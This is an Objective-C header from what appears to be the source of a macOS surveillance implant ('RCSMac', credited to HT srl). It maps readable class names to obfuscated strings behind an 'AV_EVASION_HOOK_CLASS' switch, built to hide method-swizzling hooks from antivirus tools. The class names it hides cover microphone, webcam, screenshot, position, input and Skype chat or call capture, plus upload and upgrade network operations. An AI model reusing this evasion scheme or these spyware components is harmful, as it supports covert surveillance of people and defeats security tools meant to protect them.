//
//  RCSMInterface.h
//  RCSMac
//
//  Created by kiodo on 8/1/12.
//  Copyright 2012 HT srl. All rights reserved.
//

#ifndef __RCSMInterface_h__
#define __RCSMInterface_h__

//#define AV_EVASION_HOOK_CLASS

/*
 * Generic class 
 */
//#define AuthNetworkOperation __qmbdf_i_8vui1fuxpsl2qfsbujpo
//#define AuthNetworkOperationTest __qmbdf_i_8vui1fuxpsl2qfsbujpo7ftu
//#define ByeNetworkOperation __qmbdf_i_9zf1fuxpsl2qfsbujpo
//#define ByeNetworkOperationTest __qmbdf_i_9zf1fuxpsl2qfsbujpo7ftu
//#define ConfNetworkOperation __qmbdf_i_0pog1fuxpsl2qfsbujpo
//#define ConfNetworkOperationTest __qmbdf_i_0pog1fuxpsl2qfsbujpo7ftu
//#define DownloadNetworkOperation __qmbdf_i_1pxompbe1fuxpsl2qfsbujpo
//#define DownloadNetworkOperationTest __qmbdf_i_1pxompbe1fuxpsl2qfsbujpo7ftu
//#define FSNetworkOperation __qmbdf_i_361fuxpsl2qfsbujpo
//#define FSNetworkOperationTest __qmbdf_i_361fuxpsl2qfsbujpo7ftu
//#define IDNetworkOperation __qmbdf_i_611fuxpsl2qfsbujpo
//#define IDNetworkOperationTest __qmbdf_i_611fuxpsl2qfsbujpo7ftu
//#define LogNetworkOperation __qmbdf_i_9ph1fuxpsl2qfsbujpo
//#define LogNetworkOperationTest __qmbdf_i_9ph1fuxpsl2qfsbujpo7ftu
//#define MacContact __qmbdf_i_0bd0poubdu
//#define RESTNetworkProtocol __qmbdf_i_52671fuxpsl3spupdpm
//#define RESTNetworkProtocolTest __qmbdf_i_52671fuxpsl3spupdpm7ftu
//#define RESTTransport __qmbdf_i_52677sbotqpsu
//#define RESTTransportTest __qmbdf_i_52677sbotqpsu7ftu
//#define SkypeChatMessage __qmbdf_i_6lzqf0ibu0fttbhf
//#define Transport __qmbdf_i_7sbotqpsu
//#define UpgradeNetworkOperation __qmbdf_i_8qhsbef1fuxpsl2qfsbujpo
//#define UpgradeNetworkOperationTest __qmbdf_i_8qhsbef1fuxpsl2qfsbujpo7ftu
//#define UploadNetworkOperation __qmbdf_i_8qmpbe1fuxpsl2qfsbujpo
//#define UploadNetworkOperationTest __qmbdf_i_8qmpbe1fuxpsl2qfsbujpo7ftu
//#define __CWInterface __qmbdf_i___006oufsgbdf
//#define __m_MActions __qmbdf_i___n_08dujpot
//#define __m_MAgentApplication __qmbdf_i___n_08hfou8qqmjdbujpo
//#define __m_MAgentDevice __qmbdf_i___n_08hfou1fwjdf
//#define __m_MAgentMicrophone __qmbdf_i___n_08hfou0jdspqipof
//#define __m_MAgentOrganizer __qmbdf_i___n_08hfou2shbojafs
//#define __m_MAgentPosition __qmbdf_i___n_08hfou3ptjujpo
//#define __m_MAgentScreenshot __qmbdf_i___n_08hfou6dsffotipu
//#define __m_MAgentWebcam __qmbdf_i___n_08hfou0fcdbn
//#define __m_MConfManager __qmbdf_i___n_00pog0bobhfs
//#define __m_MCore __qmbdf_i___n_00psf
//#define __m_MDiskQuota __qmbdf_i___n_01jtl4vpub
//#define __m_MEncryption __qmbdf_i___n_02odszqujpo
//#define __m_MEvents __qmbdf_i___n_02wfout
//#define __m_MFileSystemManager __qmbdf_i___n_03jmf6ztufn0bobhfs
//#define __m_MInfoManager __qmbdf_i___n_06ogp0bobhfs
//#define __m_MInputManager __qmbdf_i___n_06oqvu0bobhfs
//#define __m_MLogManager __qmbdf_i___n_09ph0bobhfs
//#define __m_MLogger __qmbdf_i___n_09phhfs
//#define __m_MSharedMemory __qmbdf_i___n_06ibsfe0fnpsz
//#define __m_MTaskManager __qmbdf_i___n_07btl0bobhfs
//#define __m_MUtils __qmbdf_i___n_08ujmt
//#define myLoggingObject __qmbdf_i_nz9phhjoh2ckfdu
//
///*
// * Hooking class implementation
// */
//#define myAIContentController __qmbdf_i_nz860poufou0pouspmmfs
//#define myBrowserWindowController __qmbdf_i_nz9spxtfs0joepx0pouspmmfs
//#define myEventController __qmbdf_i_nz2wfou0pouspmmfs
//#define myIMWebViewController __qmbdf_i_nz600fc9jfx0pouspmmfs
//#define myIMWindowController __qmbdf_i_nz600joepx0pouspmmfs
//#define myMacCallX __qmbdf_i_nz0bd0bmm1
//#define myNSDocumentController __qmbdf_i_nz161pdvnfou0pouspmmfs
//#define mySKConversationManager __qmbdf_i_nz680powfstbujpo0bobhfs
//#define mySKUserInteraction __qmbdf_i_nz688tfs6oufsbdujpo
//#define mySMProcessController __qmbdf_i_nz603spdftt0pouspmmfs
//#define mySkypeChat __qmbdf_i_nz6lzqf0ibu

/*
 * Class string for getting Class ptr in method swizzling...
 */
#ifdef AV_EVASION_HOOK_CLASS

#define kMyAIContentController "__qmbdf_i_nz860poufou0pouspmmfs"
#define kMyBrowserWindowController "__qmbdf_i_nz9spxtfs0joepx0pouspmmfs"
#define kMyEventController "__qmbdf_i_nz2wfou0pouspmmfs"
#define kMyIMWebViewController "__qmbdf_i_nz600fc9jfx0pouspmmfs"
#define kMyIMWindowController "__qmbdf_i_nz600joepx0pouspmmfs"
#define kMyMacCallX "__qmbdf_i_nz0bd0bmm1"
#define kMyNSDocumentController "__qmbdf_i_nz161pdvnfou0pouspmmfs"
#define kMySKConversationManager "__qmbdf_i_nz680powfstbujpo0bobhfs"
#define kMySKUserInteraction "__qmbdf_i_nz688tfs6oufsbdujpo"
#define kMySMProcessController "__qmbdf_i_nz603spdftt0pouspmmfs"
#define kMySkypeChat "__qmbdf_i_nz6lzqf0ibu"

#else

#define kMyAIContentController "myAIContentController"
#define kMyBrowserWindowController "myBrowserWindowController"
#define kMyEventController "myEventController"
#define kMyIMWebViewController "myIMWebViewController"
#define kMyIMWindowController "myIMWindowController"
#define kMyMacCallX "myMacCallX"
#define kMyNSDocumentController "myNSDocumentController"
#define kMySKConversationManager "mySKConversationManager"
#define kMySKUserInteraction "mySKUserInteraction"
#define kMySMProcessController "mySMProcessController"
#define kMySkypeChat "mySkypeChat"

#endif

#endif